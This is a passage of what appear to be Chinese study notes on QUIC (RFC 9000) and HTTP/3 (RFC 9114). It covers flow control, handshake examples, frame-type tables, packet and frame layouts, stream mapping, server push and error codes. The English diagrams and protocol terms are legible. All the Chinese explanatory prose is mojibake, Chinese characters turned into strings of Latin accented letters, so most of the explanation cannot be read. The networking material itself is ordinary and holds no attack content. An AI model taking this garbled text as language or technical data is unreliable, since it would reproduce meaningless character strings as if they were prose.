è¾“çš„æ•°æ®ã€‚ä¸ºäº†ä¿æŒè¿æ¥ä¸è¢«å…³é—­ï¼Œåœ¨æ²¡æœ‰å¯å¼•å‘ACKçš„æ•°æ®åŒ…å¤„äºä¼ è¾“ä¸­æ—¶ï¼Œè¢«æµé‡æ§åˆ¶é™åˆ¶æ‰€é˜»å¡çš„å‘é€æ–¹åº”è¯¥å®šæœŸå‘é€ä¸€ä¸ªæµæ•°æ®é˜»å¡å¸§æˆ–æ•°æ®é˜»å¡å¸§ã€‚\n0x43ã€æµé‡æ§åˆ¶æ€§èƒ½ å¦‚æœç»ˆç«¯ä¸èƒ½ç¡®ä¿å…¶å¯¹ç«¯å§‹ç»ˆåœ¨è¯¥è¿æ¥ä¸Šæœ‰å¤§äºå¯¹ç«¯å¸¦å®½æ—¶å»¶ç§¯çš„æµé‡æ§åˆ¶é¢åº¦ï¼Œå…¶æ¥æ”¶ååé‡å°†è¢«æµé‡æ§åˆ¶é™åˆ¶ã€‚\nåŒ…ä¸¢å¤±ä¼šå¯¼è‡´æ¥æ”¶ç¼“å†²åŒºå‡ºç°ç©ºéš™ï¼Œä»è€Œé˜»ç¢åº”ç”¨å±‚æ¶ˆè€—æ•°æ®å¹¶é‡Šæ”¾æ¥æ”¶ç¼“å†²ç©ºé—´ã€‚\nåŠæ—¶å‘é€æµé‡æ§åˆ¶ä¸Šé™æ›´æ–°èƒ½æé«˜æ€§èƒ½ã€‚å‘é€åªåŒ…å«æµé‡æ§åˆ¶æ›´æ–°çš„æ•°æ®åŒ…ä¼šå¢åŠ ç½‘ç»œè´Ÿè½½ï¼Œå¯¹æ€§èƒ½äº§ç”Ÿä¸åˆ©å½±å“ã€‚å°†æµé‡æ§åˆ¶æ›´æ–°ä¸å…¶ä»–å¸§ä¸€èµ·å‘å‡ºï¼Œä¾‹å¦‚å¦‚ACKå¸§ï¼Œå¯ä»¥é™ä½æ­¤ç±»æ›´æ–°å¸¦æ¥çš„æ¶ˆè€—ã€‚\n0x45ã€æµæœ€ç»ˆæ•°æ®é‡ ä¸ç®¡æµæ˜¯å¦‚ä½•ç»ˆæ­¢çš„ï¼Œå‘é€æ–¹å§‹ç»ˆè¯•å›¾å°†æµçš„æœ€ç»ˆæ•°æ®é‡å¯é åœ°å‘é€ç»™æ¥æ”¶æ–¹ã€‚æœ€ç»ˆæ•°æ®é‡æ˜¯ å¸¦æœ‰FINç½®ä½çš„æµå¸§çš„Offsetï¼ˆä¸‹æ ‡ï¼‰å’ŒLengthï¼ˆé•¿åº¦ï¼‰å­—æ®µå€¼çš„æ€»å’Œï¼Œæ³¨æ„è¿™äº›å­—æ®µå¯èƒ½æ˜¯éšå¼çš„ã€‚\n0x46ã€å¹¶å‘æ§åˆ¶ ç»ˆç«¯é™åˆ¶å¯¹ç«¯ç´¯è®¡å¯ä»¥å¼€å¯çš„æµçš„æ•°é‡ã€‚åªæœ‰æµIDå°äº(max_streams * 4 + first_stream_id_of_type)çš„æµå¯ä»¥è¢«å¼€å¯ï¼Œè¯¦è§è¡¨1ã€‚åˆå§‹é™åˆ¶ç”±ä¼ è¾“å‚æ•°è®¾ç½®ï¼Œè¯¦è§ç¬¬18.2ç« ã€‚éšåçš„é™åˆ¶ç”±æœ€å¤§æµå¸§æ¨å‡º\nmax_streamsä¸èƒ½è¶…é™$2^{60}$\n0x5 è¿æ¥ 0x53 è¿æ¥æ“ä½œ å½“å®ç°ç”¨æˆ·ç«¯æ—¶ï¼Œåº”ç”¨å±‚åè®®å¯ä»¥ï¼š\nåˆ›å»ºä¸€ä¸ªè¿æ¥ï¼Œå¼€å§‹è¿›è¡Œç¬¬7ç« æè¿°çš„äº¤äº’è¿‡ç¨‹ï¼› å¦‚æœæ”¯æŒï¼Œå¯ç”¨æ—©æœŸæ•°æ®åŠŸèƒ½ï¼› å½“æ—©æœŸæ•°æ®è¢«æœåŠ¡ç«¯æ¥å—æˆ–æ‹’ç»æ—¶ï¼Œæ”¶åˆ°é€šçŸ¥ã€‚ å½“å®ç°æœåŠ¡ç«¯æ—¶ï¼Œåº”ç”¨å±‚åè®®å¯ä»¥ï¼š\nç›‘å¬ä¼ å…¥çš„è¿æ¥ï¼Œå‡†å¤‡è¿›è¡Œç¬¬7ç« æè¿°çš„äº¤äº’è¿‡ç¨‹ï¼› å¦‚æœæ”¯æŒæ—©æœŸæ•°æ®ï¼Œåœ¨å‘é€ç»™å®¢æˆ·ç«¯çš„TLSæ¢å¤ticketä¸­åµŒå…¥åº”ç”¨å±‚æ§åˆ¶æ•°æ®ï¼› å¦‚æœæ”¯æŒæ—©æœŸæ•°æ®ï¼Œä»æ¥æ”¶è‡ªå®¢æˆ·ç«¯çš„æ¢å¤ticketä¸­æ¢å¤åº”ç”¨å±‚æ§åˆ¶æ•°æ®ï¼Œå¹¶æ ¹æ®è¯¥ä¿¡æ¯æ¥å—æˆ–æ‹’ç»æ—©æœŸæ•°æ®ã€‚ å½“åŒæ—¶å®ç°å®¢æˆ·ç«¯åŠæœåŠ¡ç«¯æ—¶ï¼Œåº”ç”¨å±‚åè®®å¯ä»¥ï¼š\nå¦‚ä¼ è¾“å‚æ•°ï¼ˆ[ç¬¬7.4ç« ]ï¼‰æ‰€è¿°ï¼Œä¸ºæ¯ç§ç±»å‹å…è®¸çš„æµçš„é…ç½®æœ€å°çš„åˆå§‹æ•°é‡ï¼› é€šè¿‡è®¾ç½®æµçº§åˆ«åŠè¿æ¥çº§åˆ«çš„æµé‡æ§åˆ¶é™åˆ¶ï¼Œé™åˆ¶æ¥æ”¶ç¼“å­˜åŒºèµ„æºåˆ†é…ï¼› è¯†åˆ«æ¡æ‰‹å·²ç»æˆåŠŸç»“æŸæŠ‘æˆ–ä»åœ¨è¿›è¡Œä¸­ï¼› ä¿æŒè¿æ¥ä¸è¢«é»˜è®¤å…³é—­ï¼Œå³é€šè¿‡PINGå¸§ï¼ˆ[ç¬¬19.2ç« ]ï¼‰æˆ–å…¶ä»–è¯·æ±‚ä½¿å¾—ä¼ è¾“å±‚åœ¨ç©ºé—²è¶…æ—¶ï¼ˆ[ç¬¬10.1ç« ]ï¼‰å‰å‘é€é¢å¤–çš„å¸§ï¼›ä»¥åŠ ç«‹å³å…³é—­è¿æ¥ï¼ˆ[ç¬¬10.2ç« ]ï¼‰ã€‚ 0x7 åŠ å¯†ä¸ä¼ è¾“æ¡æ‰‹ 1-RTT example\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Client Server Initial[0]: CRYPTO[CH] -\u0026gt; Initial[0]: CRYPTO[SH] ACK[0] Handshake[0]: CRYPTO[EE, CERT, CV, FIN] \u0026lt;- 1-RTT[0]: STREAM[1, \u0026#34;...\u0026#34;] Initial[1]: ACK[0] Handshake[0]: CRYPTO[FIN], ACK[0] 1-RTT[0]: STREAM[0, \u0026#34;...\u0026#34;], ACK[0] -\u0026gt; Handshake[1]: ACK[0] \u0026lt;- 1-RTT[1]: HANDSHAKE_DONE, STREAM[3, \u0026#34;...\u0026#34;], ACK[0] 0-RTT example\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Client Server Initial[0]: CRYPTO[CH] 0-RTT[0]: STREAM[0, \u0026#34;...\u0026#34;] -\u0026gt; Initial[0]: CRYPTO[SH] ACK[0] Handshake[0] CRYPTO[EE, FIN] \u0026lt;- 1-RTT[0]: STREAM[1, \u0026#34;...\u0026#34;] ACK[0] Initial[1]: ACK[0] Handshake[0]: CRYPTO[FIN], ACK[0] 1-RTT[1]: STREAM[0, \u0026#34;...\u0026#34;] ACK[0] -\u0026gt; Handshake[1]: ACK[0] \u0026lt;- 1-RTT[1]: HANDSHAKE_DONE, STREAM[3, \u0026#34;...\u0026#34;], ACK[1] 0x12 Packets and Frames 0x124 Frames and Frame Types 1 2 3 Packet Payload { Frame (8..) ..., } figure:QUIC payload\n1 2 3 4 Frame { Frame Type (i), Type-Dependent Fields (..), } figure:Generic Frame layout\nType Value Frame Type Name Definition Pkts Spec 0x00 PADDING Section 19.1 IH01 NP 0x01 PING Section 19.2 IH01 0x02-0x03 ACK Section 19.3 IH_1 NC 0x04 RESET_STREAM Section 19.4 __01 0x05 STOP_SENDING Section 19.5 __01 0x06 CRYPTO Section 19.6 IH_1 0x07 NEW_TOKEN Section 19.7 ___1 0x08-0x0f STREAM Section 19.8 __01 F 0x10 MAX_DATA Section 19.9 __01 0x11 MAX_STREAM_DATA Section 19.10 __01 0x12-0x13 MAX_STREAMS Section 19.11 __01 0x14 DATA_BLOCKED Section 19.12 __01 0x15 STREAM_DATA_BLOCKED Section 19.13 __01 0x16-0x17 STREAMS_BLOCKED Section 19.14 __01 0x18 NEW_CONNECTION_ID Section 19.15 __01 P 0x19 RETIRE_CONNECTION_ID Section 19.16 __01 0x1a PATH_CHALLENGE Section 19.17 __01 P 0x1b PATH_RESPONSE Section 19.18 ___1 P 0x1c-0x1d CONNECTION_CLOSE Section 19.19 ih01 N 0x1e HANDSHAKE_DONE Section 19.20 ___1 0x16 å¯å˜é•¿æ•´å‹ æœ€é«˜çš„2ä¸ªæœ‰æ•ˆä½ å­—èŠ‚é•¿åº¦ å¯ç”¨ä½æ•° å¯è¡¨ç¤ºèŒƒå›´ 00 1 6 0-63 01 2 14 0-16383 10 4 30 0-1073741823 11 8 62 0-4611686018427387903 0x17 Packet Formats 1 2 3 4 5 6 7 8 9 10 11 12 Long Header Packet { Header Form (1) = 1, Fixed Bit (1) = 1, Long Packet Type (2), Type-Specific Bits (4), Version (32), Destination Connection ID Length (8), Destination Connection ID (0..160), Source Connection ID Length (8), Source Connection ID (0..160), Type-Specific Payload (..), } Long Packet Type\nç±»å‹ åç§° ç« èŠ‚ 0x00 åˆå§‹ [ç¬¬17.2.2ç« ] 0x01 0-RTT [ç¬¬17.2.3ç« ] 0x02 æ¡æ‰‹ [ç¬¬17.2.4ç« ] 0x03 é‡è¯• [ç¬¬17.2.5ç« ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 Version Negotiation Packet { Header Form (1) = 1, Unused (7), Version (32) = 0, Destination Connection ID Length (8), Destination Connection ID (0..2040), Source Connection ID Length (8), Source Connection ID (0..2040), Supported Version (32) ..., } Initial Packet { Header Form (1) = 1, Fixed Bit (1) = 1, Long Packet Type (2) = 0, Reserved Bits (2), Packet Number Length (2), Version (32), Destination Connection ID Length (8), Destination Connection ID (0..160), Source Connection ID Length (8), Source Connection ID (0..160), Token Length (i), Token (..), Length (i), Packet Number (8..32), Packet Payload (8..), } 0-RTT Packet { Header Form (1) = 1, Fixed Bit (1) = 1, Long Packet Type (2) = 1, Reserved Bits (2), Packet Number Length (2), Version (32), Destination Connection ID Length (8), Destination Connection ID (0..160), Source Connection ID Length (8), Source Connection ID (0..160), Length (i), Packet Number (8..32), Packet Payload (8..), } Handshake Packet { Header Form (1) = 1, Fixed Bit (1) = 1, Long Packet Type (2) = 2, Reserved Bits (2), Packet Number Length (2), Version (32), Destination Connection ID Length (8), Destination Connection ID (0..160), Source Connection ID Length (8), Source Connection ID (0..160), Length (i), Packet Number (8..32), Packet Payload (8..), } Retry Packet { Header Form (1) = 1, Fixed Bit (1) = 1, Long Packet Type (2) = 3, Unused (4), Version (32), Destination Connection ID Length (8), Destination Connection ID (0..160), Source Connection ID Length (8), Source Connection ID (0..160), Retry Token (..), Retry Integrity Tag (128), } 1 2 3 4 5 6 7 8 9 10 11 1-RTT Packet { Header Form (1) = 0, Fixed Bit (1) = 1, Spin Bit (1), Reserved Bits (2), Key Phase (1), Packet Number Length (2), Destination Connection ID (0..160), Packet Number (8..32), Packet Payload (8..), } 0x18 ä¼ è¾“å‚æ•°ç¼–ç  1 2 3 4 5 6 7 8 Transport Parameters { Transport Parameter (..) ..., } Transport Parameter { Transport Parameter ID (i), Transport Parameter Length (i), Transport Parameter Value (..), } 0x19 å¸§ç±»å‹å’Œæ ¼å¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 PADDING Frame { Type (i) = 0x00, } PING Frame { Type (i) = 0x01, } ACK Frame { Type (i) = 0x02..0x03, Largest Acknowledged (i), ACK Delay (i), ACK Range Count (i), First ACK Range (i), ACK Range (..) ..., [ECN Counts (..)], } ACK Range { Gap (i), ACK Range Length (i), } ECN Counts { ECT0 Count (i), ECT1 Count (i), ECN-CE Count (i), } RESET_STREAM Frame { Type (i) = 0x04, Stream ID (i), Application Protocol Error Code (i), Final Size (i), } STOP_SENDING Frame { Type (i) = 0x05, Stream ID (i), Application Protocol Error Code (i), } CRYPTO Frame { Type (i) = 0x06, Offset (i), Length (i), Crypto Data (..), } NEW_TOKEN Frame { Type (i) = 0x07, Token Length (i), Token (..), } STREAM Frame { Type (i) = 0x08..0x0f, Stream ID (i), [Offset (i)], [Length (i)], Stream Data (..), } MAX_DATA Frame { Type (i) = 0x10, Maximum Data (i), } MAX_STREAM_DATA Frame { Type (i) = 0x11, Stream ID (i), Maximum Stream Data (i), } MAX_STREAMS Frame { Type (i) = 0x12..0x13, Maximum Streams (i), } DATA_BLOCKED Frame { Type (i) = 0x14, Maximum Data (i), } STREAM_DATA_BLOCKED Frame { Type (i) = 0x15, Stream ID (i), Maximum Stream Data (i), } STREAMS_BLOCKED Frame { Type (i) = 0x16..0x17, Maximum Streams (i), } NEW_CONNECTION_ID Frame { Type (i) = 0x18, Sequence Number (i), Retire Prior To (i), Length (8), Connection ID (8..160), Stateless Reset Token (128), } RETIRE_CONNECTION_ID Frame { Type (i) = 0x19, Sequence Number (i), } PATH_CHALLENGE Frame { Type (i) = 0x1a, Data (64), } PATH_RESPONSE Frame { Type (i) = 0x1b, Data (64), } CONNECTION_CLOSE Frame { Type (i) = 0x1c..0x1d, Error Code (i), [Frame Type (i)], Reason Phrase Length (i), Reason Phrase (..), } HANDSHAKE_DONE Frame { Type (i) = 0x1e, } RFC9114 HTTP/1.1ç›´æ¥ä½¿ç”¨ç©ºæ ¼å’Œcrlfæ¥åˆ†å‰²ä¼ é€’æ•°æ®ï¼Œè™½ç„¶å¯è¯»æ€§é«˜ä½†æ˜¯ç½‘ç»œåˆ©ç”¨ç‡ä¸é«˜ï¼Œå¤šä¸ªè¯·æ±‚ä½¿ç”¨å¯¹ä¸ªTCPè¿æ¥å¹¶è¡Œè¯·æ±‚è¿˜ä¼šåŠ é‡æ‹¥å¡ã€‚\nHTTP/2å¼•å…¥äº†binary framingå’Œmultiplexing layerï¼Œåœ¨ä¸ä¿®æ”¹ä¼ è¾“å±‚çš„æ¸…è‹¦é‚£ä¸ªä¸‹æ”¹å–„å»¶è¿Ÿã€‚ç„¶è€Œï¼ŒHTTP/2çš„å¤šè·¯å¤ç”¨å¹¶è¡Œæ€§è´¨å¯¹TCPçš„ä¸¢å¤±æœºåˆ¶æ˜¯ä¸å¯è§çš„(TCPå‘ä¸Šæä¾›é€æ˜æœåŠ¡)ï¼Œä¸€ä¸ªä¸¢å¤±æˆ–è€…é‡æ–°æ’åºçš„æ•°æ®åŒ…ä¼šå¯¼è‡´æ‰€æœ‰çš„æ´»åŠ¨äº‹åŠ¡ç»å†ä¸€ä¸ªæš‚åœï¼Œè€Œä¸ç®¡è¯¥äº‹åŠ¡æ˜¯å¦ç›´æ¥æ”¶åˆ°ä¸¢å¤±æ•°æ®åŒ…çš„å½±å“ã€‚\nQUICåè®®åˆå¹¶äº†stream multiplexingå’Œper-stream controlï¼Œé€šè¿‡æä¾›æµçº§åˆ«çš„å¯é æ€§å’Œæ•´ä¸ªè¿æ¥çš„æ‹¥å¡æ§åˆ¶ï¼Œæé«˜HTTPæ€§èƒ½ã€‚QUICåœ¨ä¼ è¾“å±‚åˆå¹¶äº†TLS 1.3æä¾›HTTPSçš„æœºå¯†æ€§å’Œå®Œæ•´æ€§ï¼Œæ”¹è¿›äº†TCP Fast Opençš„è¿æ¥è®¾ç½®å»¶è¿Ÿã€‚\nQUICæä¾›äº†åè®®åå•†ã€åŸºäºæµçš„å¤šè·¯å¤ç”¨å’Œæµæ§åˆ¶ã€‚HTTP/3è¯·æ±‚çš„å¤šè·¯å¤ç”¨æ˜¯ä½¿ç”¨QUICæŠ½è±¡æµæ¥æ‰§è¡Œçš„ï¼Œæ¯ä¸ªè¯·æ±‚å“åº”å¯¹æ¶ˆè€—å•ä¸€çš„QUICæµï¼Œæµä¹‹é—´ç›¸äº’ç‹¬ç«‹ï¼Œä¸€ä¸ªæµçš„é˜»å¡å’ŒæŠ›å¼ƒä¸ä¼šå½±å“å…¶ä»–æµã€‚\næ¯ä¸ªæµä¸­ï¼ŒHTTP/3é€šä¿¡çš„åŸºæœ¬å•å…ƒå¼frameã€‚æ¯ä¸ªframeéƒ½æœ‰ä¸åŒçš„ç”¨é€”ï¼Œä¾‹å¦‚HEADERSå’ŒDATA frameæ„æˆäº†HTTPè¯·æ±‚å’Œç›¸åº”çš„åŸºç¡€ã€‚\nserver pushæ˜¯HTTP/2ä¸­å¼•å…¥çš„äº¤äº’æ¨¡å¼,å…è®¸serveråœ¨clientå‘å‡ºæŒ‡å®šè¯·æ±‚å‰æƒ³clentæ¨é€ä¸€ä¸ªrequest-respose exchangeã€‚å‡ ä¸ªHTTP/3 frameè¢«ç”¨æ¥ç®¡ç†server pushï¼Œå¦‚PUSH_PROMISEã€MAX_PUSH_IDå’ŒCANCEL_PUSH.\næ–‡æ¡£ç»„ç»‡\nç¬¬ä¸‰ç« ä»‹ç»äº†å¦‚ä½•å‘ç°HTTP/3æ–­ç‚¹å’Œå¦‚ä½•å»ºç«‹è¿æ¥ ç¬¬å››ç« æè¿°å¦‚ä½•ä½¿ç”¨frameæ¥è¡¨è¾¾HTTPè¯­ä¹‰ ç¬¬äº”ç« æè¿°äº†HTTP/3è¿æ¥æ—¶å¦‚ä½•è¢«ä¼˜é›…æˆ–è€…çªç„¶åœ°åœæ­¢çš„ ç¬¬å…­ç« æè¿°äº†ä½¿ç”¨QUICæµçš„æ–¹å¼ ç¬¬ä¸ƒç« æè¿°äº†å¤§å¤šæ•°æµä¸Šä½¿ç”¨çš„å¸§ ç¬¬ä¸‰ç« ã€è¿æ¥è®¾ç½®å’Œç®¡ç† å‘ç°HTTP/3 endpoint\nclientè®¿é—®httpsçš„urièµ„æºï¼Œè§£ææˆIPåœ°å€ï¼Œåœ¨æŒ‡å®šç«¯å£å»ºç«‹QUICè¿æ¥ï¼Œé€šè¿‡å®‰å…¨è¿æ¥å‘serverå‘é€HTTP/3è¯·æ±‚ã€‚è¿æ¥é—®é¢˜(é˜»å¡UDP)å¯èƒ½å¯¼è‡´æ— æ³•å»ºç«‹QUICè¿æ¥ï¼Œè¿™ç§æƒ…å†µclientå°è¯•åŸºäºtcpç‰ˆæœ¬çš„HTTP\nå¯ä»¥é€šè¿‡HTTPç›¸åº”å¤´å­—æ®µå‘ŠçŸ¥ç«¯å£æ”¯æŒHTTP/3åè®®\nAlt-Svc: h3=\u0026#34;:50781\u0026#34; æ¥æ”¶åˆ°Alt-Svcå“åº”clientå°è¯•å»ºç«‹QUICè¿æ¥\nè¿æ¥å»ºç«‹\nQUICå»ºç«‹è¿æ¥ï¼Œä½¿ç”¨TLS1.3ä»¥ä¸Šè¿›è¡Œæ¡æ‰‹ï¼Œæ¡æ‰‹ä¸­é€šè¿‡é€‰æ‹©APLNä»¤ç‰Œh3è¡¨ç¤ºHTTP/3æ”¯æŒï¼Œå…¶ä»–åº”ç”¨å±‚åè®®çš„æ”¯æŒå¯ä»¥åœ¨ç›¸åŒæ¡æ‰‹ä¸­æä¾›ã€‚QUICæ ¸å¿ƒåè®®ç›¸å…³é€‰é¡¹åœ¨åˆå§‹åŠ å¯†æ¡æ‰‹è®¾ç½®æ—¶ï¼ŒHTTP3çš„è®¾ç½®ä¼ å…¥åˆ°SETTINGS frameã€‚QUICè¿æ¥å»ºç«‹åï¼ŒSETTINGS frameå¿…é¡»è¢«æ¯ä¸ªç«¯ç‚¹ä½œä¸ºHTTPæ§åˆ¶æµçš„åˆå§‹frameå‘é€ã€‚\nè¿æ¥å¤ç”¨\nä¸ºäº†ä½¿ç”¨ä¸€ä¸ªç°æœ‰çš„è¿æ¥åˆ°ä¸€ä¸ªæ–°çš„æºï¼Œå®¢æˆ·ç«¯å¿…é¡»éªŒè¯æœåŠ¡å™¨ä¸ºæ–°çš„æºæœåŠ¡å™¨æä¾›çš„è¯ä¹¦ï¼Œè¿™æ„å‘³ç€å®¢æˆ·ç«¯éœ€è¦ä¿ç•™æœåŠ¡å™¨è¯ä¹¦å’ŒéªŒè¯è¯¥è¯ä¹¦éœ€è¦çš„ä»»ä½•é¢å¤–ä¿¡æ¯ï¼Œä¸è¿™æ ·åšçš„å®¢æˆ·ç«¯å°†æ— æ³•ä¸ºå…¶å…¶ä»–æ¥æºé‡ç”¨è¿æ¥ã€‚\nç¬¬å››ç« ã€åœ¨HTTP3ä¸­è¡¨è¾¾HTTPè¯­ä¹‰ ä¸€ä¸ªHTTPæ¶ˆæ¯åŒ…æ‹¬\nheaderï¼Œsent as single HEADERS frame Optional contentï¼Œsent as a series of DATA frames Optional tailer section, sent as a single HEADERS frame æ¥æ”¶åˆ°æ— æ•ˆçš„å¸§åºåˆ—ä½œä¸º H3_FRAME_UNEXPECTED ç±»å‹çš„è¿æ¥é”™è¯¯ï¼Œå¦‚DATAåœ¨HEADERSå‰\næœåŠ¡ç«¯å¯ä»¥åœ¨å“åº”æ¶ˆæ¯äº¤é”™æ¨é€PUSH_PROMISEå¸§ï¼ŒåŒ…å«PUSH_PROMISEå¸§çš„æ¨é€å“åº”å¿…ç„¶è¢«è§†ä¸ºH3_FRAME_UNEXPECTEDç±»å‹çš„é”™è¯¯è¿æ¥\nHTTPè¯·æ±‚å“åº”å®Œå…¨æ¶ˆè´¹åŒå‘QUICæµï¼Œå½“clientå‘é€è¯·æ±‚åå¿…é¡»å…³é—­å‘é€æµï¼Œå®¢æˆ·ç«¯ç»å¯¹ä¸èƒ½è®©æµå…³é—­ä¾èµ–äºæ¥æ”¶åˆ°å¯¹å…¶è¯·æ±‚çš„å“åº”ï¼Œåœ¨å‘é€æœ€ç»ˆå“åº”åï¼ŒæœåŠ¡ç«¯å¿…é¡»å…³é—­å‘é€æµã€‚è¿™æ—¶ï¼ŒQUICæµå®Œå…¨å…³é—­ã€‚\nå¦‚æœå®¢æˆ·ç«¯å‘èµ·æµåœ¨æ²¡æœ‰æä¾›è¶³å¤ŸHTTP messageä»¥ä¾›å“åº”è€Œç»ˆæ­¢ï¼Œserver aborté”™è¯¯ç H3_REQUEST_INCOMPLETE\nH3_REQUEST_REJECTED vs H3_REQUEST_CANCELLED\nserverä¸èƒ½ä½¿ç”¨REJECTEDå¤„ç†éƒ¨åˆ†å“åº”è¯·æ±‚\nå®Œæ•´å“åº”è¢«å–æ¶ˆå¯ä»¥ä½¿ç”¨ éƒ¨åˆ†å“åº”è¢«å–æ¶ˆä¸èƒ½ä½¿ç”¨ å¹‚ç­‰è¯·æ±‚å¯å®‰å…¨é‡è¯•\nç•¸å½¢è¯·æ±‚ä»¥H3_MESSAGE_ERROEçš„æµé”™è¯¯å¤„ç†\nHTTP Fields\nQPACK(HTTP3)æè¿°äº†HPACK(HTTP2)çš„å˜ä½“,å‹ç¼©åŒ…å¤´å’Œå°¾éƒ¨éƒ¨åˆ†ï¼ŒåŒ…æ‹¬å‡ºç°åœ¨æŠ¥å¤´éƒ¨åˆ†çš„æ§åˆ¶æ•°æ®ã€‚ä¸ºäº†è·å¾—æ›´å¥½çš„å‹ç¼©æ•ˆç‡ï¼ŒCookieså­—æ®µå¯èƒ½è¢«åˆ†æˆå¤šä¸ªfields lineï¼Œå¦‚æœè§£å‹ç¼©çš„å­—æ®µåŒ…å«å¤šä¸ªcookieå­—æ®µï¼Œè¿™äº›è¡Œå¿…é¡»ä»¥; (0x3b 0x20)åˆ†å‰²\nserveræ”¶åˆ°headerè¿‡å¤§å¯ä»¥å‘é€ä¸€ä¸ªHTTP 431çŠ¶æ€ç \nHTTP Control Data\nä¼ªæŠ¥å¤´ä»¥:ï¼ˆ0x3aï¼‰å¼€å¤´ æºå¸¦æ§åˆ¶æ•°æ®ï¼Œè¯·æ±‚ä¼ªæŠ¥å¤´ä¸èƒ½å‡ºç°åœ¨å“åº”ä¸­ åä¹‹äº¦ç„¶ï¼Œä¼ªæŠ¥å¤´ä¸èƒ½å‡ºç°åœ¨å°¾éƒ¨éƒ¨åˆ†\næ‰€æœ‰HTTP/3è¯·æ±‚å¿…é¡»åŒ…å« :method, :scheme, and :path ä¼ªé¦–éƒ¨\nå“åº”æ˜¯ :status ä¼ªæŠ¥å¤´ æºå¸¦çŠ¶æ€ç \nHTTP3ä¸æ”¯æŒHTTPå‡çº§æœºåˆ¶\nServer Push\næ¨é€IDä»0å¼€å§‹ï¼Œé€šè¿‡MAX_PUSH_ID frameæ§åˆ¶æœåŠ¡å™¨å¯ä»¥æ‰¿è¯ºçš„æœ€å¤§æ¨é€ID\nIDç”¨äºä¸€ä¸ªæˆ–å¤šä¸ªPUSH_PROMISEframes æºå¸¦æ§åˆ¶æ•°æ®å’ŒæŠ¥å¤´å­—æ®µï¼Œè¿™äº›frameså‘é€åˆ°ç”Ÿæˆpushçš„request streamï¼Œè¿™å…è®¸server pushå’Œclientè¯·æ±‚å…³è”ï¼Œå½“ç›¸åŒçš„pushIDè¢«æ‰¿è¯ºåœ¨ä¸åŒçš„request streamsä¸­æ—¶ï¼Œè§£å‹åçš„request fieldå¿…é¡»åŒ…å«ç›¸åŒçš„åŒé¡ºåºfieldsï¼Œé”®å€¼ä¹Ÿå¿…é¡»ç›¸åŒã€‚ç„¶åpushIDè¢«åŒ…å«åœ¨æœ€ç»ˆå®ç°è¿™äº›promiseçš„push steamä¸­ï¼Œpush streamè¯†åˆ«ä»–å®ç°çš„pushIDç„¶ååŒ…å«promised requestå¯¹åº”çš„response\nreorderingï¼Œæ•°æ®å¯èƒ½åœ¨PUSH_PROMISEå‰åˆ°è¾¾ï¼Œå®¢æˆ·ç«¯ç¼“å†²æ•°æ®ç­‰å¾…åŒ¹é…ã€‚\nç¬¬å…­ç« ã€Stream Mapping and Usage QUIC streamæä¾›å¯é çš„æŒ‰åºbytesï¼Œä¼ è¾“å±‚å¯¹æ¥æ”¶åˆ°çš„æµæ•°æ®è¿›è¡Œç¼“å†²å’Œæ’åºï¼Œå‘åº”ç”¨ç¨‹åºexposeä¸€ä¸ªå¯é çš„å­—èŠ‚æµã€‚QUICæµå¯ä»¥æ˜¯åŒå‘çš„ä¹Ÿå¯ä»¥æ˜¯å•å‘çš„ï¼Œå¯ä»¥ç”±å®¢æˆ·ç«¯å‘èµ·ä¹Ÿå¯ä»¥ç”±æœåŠ¡ç«¯å‘èµ·ã€‚HTTPä½¿ç”¨QUICå‘é€æ•°æ®ï¼ŒQUICå±‚å¤„ç†å¤§éƒ¨åˆ†æµç®¡ç†ï¼ŒHTTPä¸éœ€è¦åšä»»ä½•å•ç‹¬çš„å¤šè·¯å¤ç”¨å¤„ç†ï¼Œé€šè¿‡QUICæµå‘é€çš„æ•°æ®æ€»æ˜¯æ˜ å°„åˆ°ä¸€ä¸ªç‰¹å®šçš„HTTPäº‹åŠ¡æˆ–æ•´ä¸ªHTTP3è¿æ¥ä¸Šä¸‹æ–‡ã€‚\nåŒå‘æµ æ‰€æœ‰å®¢æˆ·ç«¯å‘èµ·çš„åŒå‘æµéƒ½ç”¨äºHTTPè¯·æ±‚å’Œå“åº”ã€‚åŒå‘æµç¡®ä¿å“åº”å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¸è¯·æ±‚ç›¸å…³è”ã€‚è¿™äº›æµè¢«ç§°ä¸ºè¯·æ±‚æµã€‚\nè¿™æ„å‘³ç€å®¢æˆ·ç«¯ç¬¬ä¸€ä¸ªè¯·æ±‚å‘ç”Ÿåœ¨QUICæµ 0ä¸Šï¼Œéšåçš„è¯·æ±‚å‘ç”Ÿåœ¨æµ4ã€æµ8ä¸Šï¼Œä»¥æ­¤ç±»æ¨ã€‚ä¸ºäº†å…è®¸è¿™äº›æµæ‰“å¼€ï¼ŒHTTP/3æœåŠ¡å™¨åº”è¯¥ä¸ºå…è®¸çš„æµçš„æ•°é‡å’Œåˆå§‹æµçš„æµé‡æ§åˆ¶çª—å£é…ç½®éé›¶çš„æœ€å°å€¼ã€‚ä¸ºäº†å‡å°‘å¹¶è¡Œåº¦é™åˆ¶ï¼Œä¸€æ¬¡è‡³å°‘åº”è¯¥å…è®¸100ä¸ªè¯·æ±‚æµã€‚\nå•å‘æµ ä»»ä½•ä¸€ä¸ªå•å‘æµéƒ½å¯ä»¥ç”¨äºä¸åŒçš„ç”¨äºï¼Œç”¨é€”ç”±æµç±»å‹è¡¨ç¤ºï¼Œåœ¨æµçš„å¼€å¤´ä»¥å˜é•¿æ•´æ•°å½¢å¼å‘é€ï¼Œè¿™ä¸ªæ•´æ•°åé¢çš„æ•°æ®æ ¼å¼å’Œç»“æ„ç”±æµç±»å‹å†³å®šã€‚\nå•å‘æµheader:\n1 2 3 Unidirectional Stream Header { Stream Type (i), } 